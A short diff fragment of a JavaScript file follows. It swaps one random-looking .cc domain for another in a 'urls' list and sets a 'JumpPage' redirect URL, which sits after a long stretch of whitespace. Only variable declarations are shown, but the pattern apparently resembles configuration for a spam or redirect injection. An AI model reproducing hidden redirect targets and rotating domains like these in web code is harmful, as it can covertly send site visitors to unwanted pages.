@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'tvwadiwo.cc',
+	'vkslpaadg.cc',
 ];
                                                                                                                   
 var JumpPage="https://91nt.com";
